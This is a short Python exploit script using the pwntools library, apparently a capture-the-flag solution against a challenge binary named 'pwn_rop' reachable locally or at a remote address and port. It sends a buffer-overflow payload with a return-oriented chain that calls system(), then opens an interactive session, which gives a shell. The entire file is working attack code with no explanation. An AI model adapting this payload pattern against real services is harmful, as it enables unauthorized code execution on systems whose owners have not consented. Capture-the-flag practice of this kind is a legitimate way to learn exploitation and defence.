#coding = utf-8
#author = ywledoc

from pwn import *
import sys

if sys.argv[1] == '1':
    p = remote("114.116.54.89",  10004)
else:
    p = process("./pwn_rop")

#context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
context.log_level = "debug"
#gdb.attach(proc.pidof(p)[0])

elf = ELF("./pwn_rop")
system_addr = elf.symbols["system"]
print(hex(system_addr))

#pause()
p.recvuntil("Please Input your name.\n") 
payload = "a" * 32 + p64(0xdeadbeef) + p64(0x40122b)+ p64(0x402004) 
payload +=  p64(0x401040)
p.sendline(payload)

p.interactive()
